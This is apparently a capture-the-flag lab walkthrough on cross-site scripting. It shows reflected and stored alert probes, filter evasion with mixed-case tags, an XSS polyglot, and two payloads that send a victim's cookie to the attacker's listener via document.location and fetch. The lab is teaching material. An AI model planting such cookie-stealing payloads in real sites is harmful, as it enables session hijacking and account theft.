---
date: 2025-03-02
categories: [CTF, IML]
title: "IML - Cross-Site Scripting: Ep.7 – Demonstrate your Skills"
tags: ['privilege escalation', 'python', 'rce', 'xss']

description: "Cross-Site Scripting Ep.7 – D - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Cross-Site Scripting: Ep.7 – Demonstrate your Skills

- Make two users and log in with one of them

![image1](../resources/bf1c9864ffd44a8482e91cf21757504c.png)


![image2](../resources/965da10ce3de4cb08206b180ac07e031.png)
```java
<script>window.alert(1)</script>
```

![image3](../resources/4e83f2c4d4784e6485d2cc9391d26bca.png)

- This is the Reflected XSS

- For the Stored XSS:

![image4](../resources/bbb7b944ad8343648fe5e7abf262471d.png)


![image5](../resources/3320108f120c44b286a3b8a793ee200d.png)
<script>window.alert("hey")</script>

- The same command gets used but this time it gets sent and stored until the victim opens the message


![image6](../resources/10122d593bc440adb0592363c324166a.png)


![image7](../resources/eafa9fbb6ac34a338fcb678e5e7a6301.png)


![image8](../resources/b935bcef4e1e4e18a4f21c515ad16ef5.png)

- This one we need to steal a users token, that we don’t have access to

- Set up Python server

- And send the following to jerry as a message:
```java
<script>document.location="http://10.102.164.154:8080/?cookie="+document.cookie;</script>
```
- Or try:
```java
<script>fetch("http://10.8.31.73:8000/"+document.cookie)</script>
```

![image9](../resources/2d4279c0527943b193730f39899d949e.png)


![image10](../resources/8a22e3c7091943fdb147e6757513045a.png)


![image11](../resources/c4405880582946958c94541bcb8fe1a5.png)
- Some filter evasion is being used


![image12](../resources/86b5fe4da4ec44c4b9879a4d0384c9dd.png)

- Login with the user:
```js
<Script>alert(1)</Script>
```


![image13](../resources/4d80f80af9204e8da3cda0a19d65abf7.png)


![image14](../resources/b35a0140fd544660a5bfb989deaea27e.png)

- Filter evasion


![image15](../resources/def49cd6745b4d1f99189caa12b84c67.png)

- Using a polyglot to get past the filter (bit of a cheating way, instead of using trial and error)
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("XSS") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

![image16](../resources/c0d527b467d54c29862de012ea1c9a3c.png)


![image17](../resources/22996ece1dc74f9da2b1990175591910.png)![image18](../resources/f2c61726ff2940df8e9f18266e77ac00.png)![image19](../resources/8ad3d31a6112462fb0c5f0c1a03f0b83.png)


![image20](../resources/3643c3c909b34b3486b3aecdb4e83c73.png)![image21](../resources/849cbf03293c42f289ae7c8b15c4b94d.png)


![image22](../resources/2022a091738e414a836c7c847e3f6a77.png)![image23](../resources/cdb7e1e8632449f6b8bcfce653ea3fe6.png)